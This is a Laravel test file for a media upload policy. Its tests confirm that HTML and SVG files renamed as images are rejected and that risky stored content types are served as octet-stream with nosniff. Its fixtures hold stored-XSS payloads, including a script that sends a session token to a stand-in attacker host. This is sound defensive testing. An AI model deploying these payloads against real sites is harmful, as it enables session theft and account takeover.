<?php

use App\Models\GalleryAsset;
use App\Services\Media\UploadPolicy;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Laravel\Sanctum\Sanctum;
use Tests\Support\GalleryFixtures;

/**
 * Both customer upload paths land on an address under our own domain, and that
 * domain also serves the dashboard and the Back Office at /webmin, with session
 * tokens in localStorage. An HTML or SVG file accepted here was a complete
 * platform takeover one clicked link away.
 *
 * The test that matters most is the renamed one: validation has to read the
 * file's content, because the name is the attacker's to choose.
 */
uses(RefreshDatabase::class);

/**
 * A real upload with real bytes.
 *
 * `UploadedFile::fake()->create()` writes null bytes, so it cannot show what
 * happens when the *content* is HTML and the *name* says otherwise — which is
 * the whole attack.
 */
function uploadOf(string $name, string $content): UploadedFile
{
    $path = tempnam(sys_get_temp_dir(), 'upload-policy-');
    file_put_contents($path, $content);

    return new UploadedFile($path, $name, null, null, true);
}

const EVIL_HTML = '<html><body><script>fetch("https://attacker.test/?t="+localStorage.access_token)</script></body></html>';
const EVIL_SVG = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>';

// ── POST /api/uploads — flow attachments, carousel cards, campaign media ──

it('refuses an HTML file dressed up as a picture', function () {
    $tenant = GalleryFixtures::tenant(planGb: 1);
    Sanctum::actingAs($tenant->user);

    // The name says .png. Only the content says otherwise, and the content is
    // what decides both the stored filename and the served Content-Type.
    $this->post('/api/uploads', ['file' => uploadOf('invoice.png', EVIL_HTML)], ['Accept' => 'application/json'])
        ->assertStatus(422)
        ->assertJsonValidationErrors('file');
});

it('refuses an SVG, which is a document that can carry a script', function () {
    $tenant = GalleryFixtures::tenant(planGb: 1);
    Sanctum::actingAs($tenant->user);

    $this->post('/api/uploads', ['file' => uploadOf('logo.svg', EVIL_SVG)], ['Accept' => 'application/json'])
        ->assertStatus(422)
        ->assertJsonValidationErrors('file');
});

it('still accepts the media the product actually sends', function () {
    $tenant = GalleryFixtures::tenant(planGb: 1);
    Sanctum::actingAs($tenant->user);

    $response = $this->post('/api/uploads', [
        'file' => UploadedFile::fake()->image('photo.png', 40, 40),
    ], ['Accept' => 'application/json'])->assertOk();

    // Named after the content, which is the behaviour the allow-list relies on.
    expect($response->json('path'))->toEndWith('.png');
});

// ── The gallery ──

it('closes the rename bypass in the gallery block list', function () {
    $tenant = GalleryFixtures::tenant(planGb: 1);
    Sanctum::actingAs($tenant->user);

    // `blocked_extensions` already named html — but it read the name the
    // browser sent, so this exact upload used to sail through it.
    $this->post('/api/gallery', ['file' => uploadOf('invoice.png', EVIL_HTML)])
        ->assertStatus(422);

    expect(GalleryAsset::count())->toBe(0);
});

it('refuses an SVG in the gallery', function () {
    $tenant = GalleryFixtures::tenant(planGb: 1);
    Sanctum::actingAs($tenant->user);

    $this->post('/api/gallery', ['file' => uploadOf('logo.png', EVIL_SVG)])
        ->assertStatus(422);

    expect(GalleryAsset::count())->toBe(0);
});

// ── Serving ──

it('refuses to serve a stored content type a browser would run', function () {
    $tenant = GalleryFixtures::tenant(planGb: 1);
    Sanctum::actingAs($tenant->user);

    // Uploaded for real so the bytes exist, then the stored type is bent into
    // what a row from before the allow-list would carry. No amount of input
    // validation can retroactively fix one of those, so serving has to.
    $created = $this->post('/api/gallery', ['file' => UploadedFile::fake()->image('a.jpg')->size(30)]);
    $asset = GalleryAsset::find($created->json('data.id'));
    $asset->forceFill(['mime_type' => 'text/html'])->save();

    app('auth')->forgetGuards();

    $response = $this->get($asset->fresh()->publicUrl())->assertOk();

    expect($response->headers->get('Content-Type'))->toStartWith('application/octet-stream')
        ->and($response->headers->get('X-Content-Type-Options'))->toBe('nosniff')
        ->and($response->headers->get('Content-Security-Policy'))->toContain('sandbox');
});

it('serves a normal file as itself, with sniffing turned off', function () {
    $tenant = GalleryFixtures::tenant(planGb: 1);
    Sanctum::actingAs($tenant->user);

    $created = $this->post('/api/gallery', ['file' => UploadedFile::fake()->image('a.jpg')->size(30)]);

    app('auth')->forgetGuards();

    $response = $this->get($created->json('data.url'))->assertOk();

    // nosniff is what holds against a polyglot: a file that is a valid PNG and
    // valid HTML at once passes the allow-list as an image, and this is what
    // stops the browser deciding it is the other thing.
    expect($response->headers->get('Content-Type'))->toStartWith('image/')
        ->and($response->headers->get('X-Content-Type-Options'))->toBe('nosniff');
});

it('downgrades every content type a browser renders as a document', function () {
    foreach (['text/html', 'image/svg+xml', 'application/xhtml+xml', 'text/xml', 'application/javascript'] as $mime) {
        expect(UploadPolicy::safeContentType($mime))->toBe('application/octet-stream');
    }

    // A charset parameter must not be a way past the check.
    expect(UploadPolicy::safeContentType('text/html; charset=utf-8'))->toBe('application/octet-stream')
        ->and(UploadPolicy::safeContentType('TEXT/HTML'))->toBe('application/octet-stream');

    // And everything legitimate is passed through untouched.
    foreach (['image/png', 'video/mp4', 'audio/ogg', 'application/pdf'] as $mime) {
        expect(UploadPolicy::safeContentType($mime))->toBe($mime);
    }
});
